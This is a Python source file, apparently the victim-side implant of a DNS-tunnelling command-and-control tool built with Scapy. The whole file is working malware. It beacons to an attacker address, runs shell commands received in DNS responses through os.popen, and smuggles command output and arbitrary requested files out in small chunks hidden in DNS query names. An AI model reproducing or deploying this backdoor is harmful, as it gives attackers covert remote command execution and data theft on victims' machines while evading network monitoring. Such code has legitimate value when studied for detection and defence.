from tabnanny import verbose
from scapy.all import *
from scapy.all import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import time
from base64 import b64decode, b64encode
import os
import time

Att_ip="10.0.2.15"
TTL = 64
mtu = 24
seqnum = 64

def sendDNSReq(msg,flag, seqnum = 64, fileorprint = 1): #the default value for fileorprint flag is 1 (print), unless we sent 0(file).
    domain = '.libby.com'
    #if you are a file
    if flag == '1' or flag == '3':
        domain = bytes(domain)
        flag = bytes(flag)
        #if we reached the end of the byte zero back to 64
    if seqnum == 255:
        seqnum = 64
 
    dns_req = IP(dst=Att_ip, ttl=seqnum)/UDP(dport=53)/ DNS(rd=1, qd=DNSQR(qname=flag + msg + domain), tc=fileorprint)# file is 0 print is 1(for the attacker use)
    # sleep here to let the attacker reach the sniffing part.
    time.sleep(0.3)
    send(dns_req)
    
def sendhello():
    sendDNSReq("hi","8")


def DNSHandler(pkt):
    # if packet is with the required fields, here  DNSRR is a response made by the client.
    if not pkt[0]['DNS']['DNSRR']:
        return
    # take the packet and turn into string by decoding
    payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode()    
    handle_flag = payload[0]

    #check if the attacker intrested in printing or file
    #[1:] payload without the flag
    match handle_flag:
        case "2":
            printHandler(payload[1:]) #command from c2.
        case "1":
            fileHandler(payload[1:]) #c2 want to transfer file from victim.


def fileHandler(file_path):
    ret_ok = ""
    global seqnum

    with open(file_path, "rb") as file:
        payload = file.read()
        
    while True: 
        #'1' means i have more to send
        if len(payload) > mtu:
            sendDNSReq( payload[:mtu], '1', seqnum, 0)
            ret_ok = checkOK()
            if ret_ok == "ok":
                payload = payload[mtu:]
                seqnum += 1
        else:        
            sendDNSReq(payload ,'3', seqnum, 0)
            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum = 64
                return
 

def printHandler(command):
    # perform the command and read the output and save it into payload var.
    payload = os.popen(command).read()
    global seqnum
    ret_ok = ""
    while True: 
        if len(payload) > mtu:
            # here '2' - if i have more chunks to send, 4 for the last chunk. 
            sendDNSReq(payload[:mtu], '2', seqnum, 1)

            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum += 1
                #if received ok cut mtu chunk from the payload 
                payload = payload[mtu:]
        else: 
            sendDNSReq(payload ,'4',seqnum, 1)
            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum = 64 #reset seqnum.
                break


def checkOK():
        #check filter
        pkt = sniff(filter="udp and src host 10.0.2.15 and udp[10] & 0x80 = 0", count=1, timeout = 3)
        if pkt:
            payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode() 
            return payload[1:]

def listenRes():
    sniff(filter="udp and src host 10.0.2.15", prn=DNSHandler, timeout=5) #timeout so we won't get stuck in sniffing and continue sending hello to attacker.


def main():
    while True:
        sendhello()
        listenRes()


if __name__ == "__main__":
    main()



